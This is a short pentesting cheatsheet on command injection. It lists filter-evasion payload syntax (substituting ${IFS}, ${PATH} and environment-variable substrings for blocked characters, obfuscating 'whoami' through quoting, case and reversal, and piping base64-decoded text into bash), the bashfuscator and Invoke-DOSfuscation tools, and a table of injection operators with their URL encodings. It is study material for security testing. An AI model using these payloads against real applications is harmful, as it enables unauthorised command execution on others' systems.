# Cheatsheet

| ***Command***                                                                                                 | ***Usage***                                                                                               |
| ------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `${IFS}` <br>`{,}`<br>`%09` (encoded tab)                                                                     | Used instead of spaces to bypass.                                                                         |
| `${PATH}`                                                                                                     | Used instead of `/` to bypass.                                                                            |
| `${LS_COLORS:10:1}`                                                                                           | Used instead of `;`                                                                                       |
| `$env:HOMEPATH[0]` -> `\`                                                                                     | Powershell to print `\`                                                                                   |
| `echo %HOMEPATH:~6,-<username-length>%`                                                                       | CMD to print `\`                                                                                          |
| `echo $(tr '!-}' '"-~'<<<[)`                                                                                  | Character shifting, check the ascii sheet. *Rare usage*                                                   |
| `Who'am'i` (adding ' and ")<br>`$@`<br>`\`<br>`^`(windows)                                                    | Bypassing blacklisted commands                                                                            |
| `bash<<<$(base64 -d<<<'encoding')`                                                                            | decoding and running the base64 encoded thing. *might need to be combined with other evasion techniques.* |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`<br><br>OR<br><br>`$(a="WhOaMi";printf %s "${a,,}")`                        | Bypassing through casee evasion                                                                           |
| `$(rev<<<'imaohw')`<br><br>**Powershell**: `iex "$('imaohw'[-1..-20] -join '')"`                              | Bypassing through reversing commands                                                                      |
| `bashfuscator -c "<command>"`                                                                                 | Running bashfuscator, an obfuscation tool for bash commands. use `-r` to limit recursion depth            |
| https://github.com/danielbohannon/Invoke-DOSfuscation<br><br>Usage: <br>`Set COMMAND <command>`<br>`encoding` | DOSfucation. A windows command obfuscator.                                                                |


## Command Injection methods
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (*only if first succeeds*)            |
| OR                     | `\|`                    | `%7c%7c`                  | Second (*only if first fails*)             |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |

# Related Pages

[HTTP Verb Tampering](III.%20Exploitation/Web%20Exploitation/HTTP%20Verb%20Tampering.md): Could lead to a successful Command injection as some requests may be less filtered.